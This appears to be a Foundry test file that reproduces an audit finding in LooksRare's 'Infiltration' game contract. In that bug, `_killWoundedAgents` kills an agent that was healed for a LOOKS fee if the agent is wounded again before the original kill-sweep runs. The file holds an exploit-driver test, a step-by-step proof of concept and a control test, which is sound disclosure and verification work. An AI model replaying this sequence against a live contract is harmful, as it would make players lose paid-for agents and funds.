// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./27586-h-1-killwoundedagents-sherlock-looksrare-git.sol";

/*//////////////////////////////////////////////////////////////
    LooksRare "Infiltration" — _killWoundedAgents kills a healed agent (H-1, #27586)

    `_killWoundedAgents` only checks the agent's CURRENT status, never WHEN it
    was wounded. A player who successfully heals a wound (paying LOOKS) still
    loses the agent if it is wounded again before the original kill-sweep runs.

    - test_exploit: drives the cheatcode-free Exploit end to end, then
      re-asserts the harm (agent dead despite the paid heal) independently.
    - test_healThenRewound_stillDies: standalone rebuild with an EOA player,
      mirroring the finding's round-based PoC.
    - test_control_healWithoutRewound_survives: control — if the agent is NOT
      wounded again, the (correct) heal keeps it alive through the same
      kill-sweep, proving the bug is specifically the missing `woundedAt` check.
//////////////////////////////////////////////////////////////*/
contract KillWoundedAgentsTest is Test {
    function test_exploit() public {
        Exploit e = new Exploit();
        e.run();

        // Re-assert the HARM independently from the driver.
        assertEq(e.agentStatus(), uint8(Infiltration.AgentStatus.Dead), "agent should be dead despite paid heal");
        assertLt(e.playerLooksAfterHeal(), e.playerLooksBefore(), "heal fee should have been charged and wasted");
    }

    function test_healThenRewound_stillDies() public {
        MockLooksToken looks = new MockLooksToken();
        Infiltration game = new Infiltration(looks);
        address player = makeAddr("player");
        uint256 agentId = 1;

        looks.mint(player, game.HEAL_COST());

        // Round 1: wounded.
        game.woundAgent(agentId);

        // Round 3: player heals — succeeds.
        game.startNewRound();
        game.startNewRound();
        vm.prank(player);
        game.heal(agentId);
        (Infiltration.AgentStatus st1, ) = game.agents(agentId);
        assertEq(uint8(st1), uint8(Infiltration.AgentStatus.Active), "heal should have saved the agent");
        assertEq(looks.balanceOf(player), 0, "heal fee charged");

        // Round 4: agent wounded again (ordinary game event).
        game.startNewRound();
        game.woundAgent(agentId);

        // Kill-sweep for the ORIGINAL wound (round 1) still fires.
        uint256[] memory ids = new uint256[](1);
        ids[0] = agentId;
        game.killWoundedAgents(1, ids);

        (Infiltration.AgentStatus st2, ) = game.agents(agentId);
        assertEq(uint8(st2), uint8(Infiltration.AgentStatus.Dead), "harm: healed agent dies anyway");
    }

    /// @notice Control: if the agent is NOT wounded again after being healed,
    ///         the same kill-sweep for the original round leaves it alive —
    ///         isolating the bug to the missing `woundedAt == roundId` check.
    function test_control_healWithoutRewound_survives() public {
        MockLooksToken looks = new MockLooksToken();
        Infiltration game = new Infiltration(looks);
        address player = makeAddr("player");
        uint256 agentId = 2;

        looks.mint(player, game.HEAL_COST());

        game.woundAgent(agentId); // round 1
        game.startNewRound(); // round 2
        game.startNewRound(); // round 3
        vm.prank(player);
        game.heal(agentId); // healed, status Active — NOT wounded again this time

        game.startNewRound(); // round 4
        uint256[] memory ids = new uint256[](1);
        ids[0] = agentId;
        game.killWoundedAgents(1, ids); // sweep for original wound round

        (Infiltration.AgentStatus st, ) = game.agents(agentId);
        assertEq(uint8(st), uint8(Infiltration.AgentStatus.Active), "control: healed & not re-wounded agent survives");
    }
}
